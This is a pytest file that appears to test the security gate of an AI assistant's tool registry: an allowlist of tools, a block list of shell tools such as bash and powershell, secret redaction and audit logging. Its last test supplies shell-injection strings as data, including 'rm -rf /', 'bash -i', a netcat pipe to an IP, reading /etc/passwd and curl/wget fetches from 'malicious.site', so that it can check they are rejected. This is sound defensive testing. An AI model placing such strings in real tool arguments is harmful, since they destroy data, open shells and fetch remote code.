import pytest
from pydantic import BaseModel, Field

from viernes.tools.registry import ToolDefinition, ToolRegistry
from viernes.tools.security import (
    DEFAULT_ALLOWLIST,
    FORBIDDEN_TOOLS,
    AuditLogEntry,
    SecurityGate,
    SecurityPolicy,
    SecurityViolationError,
    sanitize_params,
)


class DummyOpenAppParams(BaseModel):
    app_name: str = Field(..., min_length=1)
    api_key: str | None = None


class DummyVolumeParams(BaseModel):
    level: int = Field(..., ge=0, le=100)


def test_default_allowlist_contains_expected_tools():
    expected = {
        "system_open_app",
        "system_volume_control",
        "system_get_time",
        "system_delete_file",
        "ticktick_list_tasks",
        "ticktick_create_task",
        "ticktick_delete_task",
    }
    assert expected.issubset(DEFAULT_ALLOWLIST)
    assert "ticktick_*" in DEFAULT_ALLOWLIST
    assert "system_time" in DEFAULT_ALLOWLIST
    assert "system_volume" in DEFAULT_ALLOWLIST
    assert "get_weather" in DEFAULT_ALLOWLIST


def test_forbidden_tools_contains_shell_and_eval():
    forbidden = {"bash", "sh", "eval", "exec", "powershell", "rm_rf"}
    assert forbidden.issubset(FORBIDDEN_TOOLS)


def test_security_policy_allows_permitted_tools():
    policy = SecurityPolicy()
    assert policy.is_allowed("system_open_app") is True
    assert policy.is_allowed("ticktick_list_tasks") is True
    assert policy.is_allowed("system_time") is True
    assert policy.is_allowed("get_weather") is True


def test_security_policy_wildcard_pattern_matching():
    policy = SecurityPolicy()
    # ticktick_* wildcard pattern
    assert policy.is_allowed("ticktick_sync") is True
    assert policy.is_allowed("ticktick_add_project") is True
    assert policy.is_allowed("ticktick_get_today_tasks") is True
    # Non-matching prefix
    assert policy.is_allowed("random_tool") is False


def test_security_policy_rejects_unauthorized_tools():
    policy = SecurityPolicy()
    assert policy.is_allowed("bash_exec") is False
    assert policy.is_allowed("rm_rf") is False
    assert policy.is_allowed("arbitrary_eval") is False

    with pytest.raises(SecurityViolationError, match="not in the strict MCP allowlist"):
        policy.validate_tool("bash_exec")


def test_security_policy_rejects_forbidden_commands():
    policy = SecurityPolicy()
    for cmd in ["bash", "sh", "eval", "exec", "powershell", "rm_rf"]:
        assert policy.is_forbidden(cmd) is True
        assert policy.is_allowed(cmd) is False
        with pytest.raises(SecurityViolationError, match="not in the strict MCP allowlist"):
            policy.validate_tool(cmd)


def test_tool_registry_rejects_registration_outside_allowlist():
    registry = ToolRegistry()

    dangerous_tool = ToolDefinition(
        name="dangerous_shell",
        description="Executes arbitrary commands",
        param_schema=DummyOpenAppParams,
        handler=lambda p: "executed",
    )

    with pytest.raises(SecurityViolationError, match="not in the strict MCP allowlist"):
        registry.register(dangerous_tool)


def test_tool_registry_registers_and_executes_allowed_tool():
    registry = ToolRegistry()

    tool = ToolDefinition(
        name="system_open_app",
        description="Abre una aplicación de escritorio",
        param_schema=DummyOpenAppParams,
        handler=lambda p: f"App {p.app_name} abierta correctamente",
    )
    registry.register(tool)

    assert registry.get("system_open_app") is tool
    assert "system_open_app" in registry.list_registered_tools()

    res = registry.execute("system_open_app", {"app_name": "spotify"})
    assert res == "App spotify abierta correctamente"


def test_tool_registry_execute_rejects_unregistered_or_invalid_params():
    registry = ToolRegistry()

    # Allowlisted tool but not yet registered in registry
    with pytest.raises(KeyError, match="permitted by allowlist but has not been registered"):
        registry.execute("system_volume_control", {"level": 50})

    # Register it
    registry.register(
        ToolDefinition(
            name="system_volume_control",
            description="Control de volumen",
            param_schema=DummyVolumeParams,
            handler=lambda p: f"Volumen al {p.level}%",
        )
    )

    # Invalid param (out of bounds)
    with pytest.raises(ValueError):
        registry.execute("system_volume_control", {"level": 200})


def test_sanitize_params_redacts_sensitive_keys():
    raw = {
        "user": "alice",
        "api_key": "secret_key_123",
        "auth_token": "token_abc",
        "password": "supersecretpassword",
        "nested": {
            "credentials": "creds",
            "normal_field": 42,
        },
        "items": [{"bearer_token": "bearer123"}, {"value": "safe"}],
    }
    sanitized = sanitize_params(raw)

    assert sanitized["user"] == "alice"
    assert sanitized["api_key"] == "[REDACTED]"
    assert sanitized["auth_token"] == "[REDACTED]"
    assert sanitized["password"] == "[REDACTED]"
    assert sanitized["nested"]["credentials"] == "[REDACTED]"
    assert sanitized["nested"]["normal_field"] == 42
    assert sanitized["items"][0]["bearer_token"] == "[REDACTED]"
    assert sanitized["items"][1]["value"] == "safe"


def test_security_gate_audit_logging_success_and_redaction():
    gate = SecurityGate()
    registry = ToolRegistry(gate=gate)

    tool = ToolDefinition(
        name="system_open_app",
        description="Abre app",
        param_schema=DummyOpenAppParams,
        handler=lambda p: f"Launched {p.app_name}",
    )
    registry.register(tool)

    # Execute with sensitive parameter
    res = registry.execute(
        "system_open_app",
        {"app_name": "slack", "api_key": "supersecret123"},
    )
    assert res == "Launched slack"

    logs = gate.audit_logs
    assert len(logs) == 1
    entry: AuditLogEntry = logs[0]
    assert entry.tool_name == "system_open_app"
    assert entry.status == "SUCCESS"
    assert entry.duration_ms is not None and entry.duration_ms >= 0.0
    assert entry.params["app_name"] == "slack"
    assert entry.params["api_key"] == "[REDACTED]"
    assert entry.error is None


def test_security_gate_audit_logging_rejection():
    gate = SecurityGate()
    registry = ToolRegistry(gate=gate)

    with pytest.raises(SecurityViolationError):
        registry.execute("bash", {"command": "echo hacked"})

    logs = gate.audit_logs
    assert len(logs) == 1
    entry = logs[0]
    assert entry.tool_name == "bash"
    assert entry.status == "REJECTED"
    assert entry.error is not None
    assert "not in the strict MCP allowlist" in entry.error


def test_security_gate_audit_logging_validation_error():
    gate = SecurityGate()
    registry = ToolRegistry(gate=gate)

    registry.register(
        ToolDefinition(
            name="system_volume_control",
            description="Control de volumen",
            param_schema=DummyVolumeParams,
            handler=lambda p: f"Volumen {p.level}",
        )
    )

    with pytest.raises(ValueError):
        registry.execute("system_volume_control", {"level": 999})

    logs = gate.audit_logs
    assert len(logs) == 1
    entry = logs[0]
    assert entry.tool_name == "system_volume_control"
    assert entry.status == "ERROR"
    assert entry.error is not None


@pytest.mark.parametrize(
    "malicious_arg",
    [
        "spotify; rm -rf /",
        "calc && bash -i",
        "app | nc 1.2.3.4 8080",
        "eval `cat /etc/passwd`",
        "spotify $(whoami)",
        "sudo shutdown -h now",
        "curl http://malicious.site/script.sh",
        "wget http://malicious.site/script.sh",
    ],
)
def test_security_gate_blocks_shell_injection_and_forbidden_binaries(malicious_arg: str):
    gate = SecurityGate()
    registry = ToolRegistry(gate=gate)

    tool = ToolDefinition(
        name="system_open_app",
        description="Abre app",
        param_schema=DummyOpenAppParams,
        handler=lambda p: f"Launched {p.app_name}",
    )
    registry.register(tool)

    with pytest.raises(SecurityViolationError, match="Security violation"):
        registry.execute("system_open_app", {"app_name": malicious_arg})

    logs = gate.audit_logs
    assert len(logs) == 1
    assert logs[0].status == "REJECTED"
    assert "Security violation" in logs[0].error
